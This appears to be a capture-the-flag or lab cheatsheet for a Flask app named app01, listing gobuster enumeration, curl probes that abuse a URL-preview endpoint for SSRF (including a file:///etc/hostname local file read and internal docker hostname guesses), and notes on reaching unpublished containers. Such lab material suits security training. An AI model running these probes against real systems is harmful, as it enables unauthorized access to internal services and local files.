# Cheatsheet — Chained API

## Targets

- **app01** — Flask public app on :80; a fetcher endpoint and an internal API
  on a private docker network

## Useful commands

```bash
gobuster dir -u http://<app01>/ -w common.txt -x py
curl -s 'http://<app01>/preview?url=http://example.com'   # probe the fetcher
curl -s 'http://<app01>/preview?url=file:///etc/hostname' # local file read?
curl -s 'http://<app01>/preview?url=http://<name>:<port>/' # internal dns guess
```

## Concepts

- SSRF reaches services bound to `0.0.0.0` inside docker nets —
  `http://<container>:<port>` resolves via docker DNS
- `file://` scheme reads local files when urllib doesn't block it
- Unpublished containers are invisible to nmap but not to the app's own net
